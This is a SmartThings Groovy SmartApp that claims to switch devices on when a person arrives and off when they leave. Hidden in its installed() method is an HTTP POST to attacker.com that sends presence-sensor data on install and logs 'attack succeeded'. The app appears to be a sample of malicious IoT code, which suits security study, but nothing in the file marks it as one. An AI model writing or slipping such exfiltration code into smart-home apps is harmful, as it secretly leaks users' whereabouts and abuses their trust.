
definition(
    name:"Turn It On When I'm Here",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn something on when you arrive and back off when you leave.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_presence-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_presence-outlet@2 x.png"
)

preferences{
    section("When I arrive and leave..."){
        input"presence1","capability.presenceSensor",title:"Who?",multiple:true
        }
    section("Turn on/off a light..."){
        input"switch1","capability.switch",multiple:true
        }
}

def installed()
{
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${presence1}"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hello"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(presence1,"presence",presenceHandler)
}

def updated()
{
    unsubscribe()
    subscribe(presence1,"presence",presenceHandler)
}

def presenceHandler(evt)
{
    log.debug"presenceHandler$evt.name:$evt.value"
    def current=presence1.currentValue("presence")
    log.debug current
    def presenceValue=presence1.find{it.currentPresence=="present"}
    log.debug presenceValue
    if(presenceValue){
        switch1.on()
        log.debug"Someone's home!"
    }
    else{
            switch1.off()
            log.debug"Everyone's away."
        }
}

